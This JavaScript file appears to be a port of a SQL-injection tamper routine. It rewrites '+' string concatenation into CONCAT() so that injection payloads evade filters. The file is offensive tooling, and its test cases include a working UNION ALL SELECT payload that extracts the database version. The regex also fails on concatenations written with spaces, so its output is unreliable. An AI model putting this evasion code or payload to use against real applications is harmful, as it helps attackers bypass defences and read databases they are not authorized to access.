function tamper(payload) {
    if (!payload) return payload;
  
    let retVal = payload;
  
    // Regex to find parts where the '+' operator is used to concatenate strings
    const regex = /('[^']+'|CHAR\(\d+\))\+.*(?<=\+)('[^']+'|CHAR\(\d+\))/g;
  
    // Function to replace '+' with CONCAT
    retVal = retVal.replace(regex, (match) => {
      const parts = match.split('+');
      const sanitizedParts = parts.map((part) => part.trim());
      return `CONCAT(${sanitizedParts.join(',')})`;
    });
  
    return retVal;
  }
  
  // Test cases
  const inputs = [
    "SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL",
    "1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe",
    "SELECT CHAR(65)+CHAR(66)+CHAR(67)",
    "INSERT INTO users (name) VALUES ('Alice' + ' Smith')",
    "UPDATE users SET name = 'John' + ' Doe' WHERE id = 1"
  ];
  
  // Apply tamper function to each input string
  inputs.forEach(input => {
    const result = tamper(input);
    console.log(`Original: ${input}`);
    console.log(`Tampered: ${result}`);
  });
  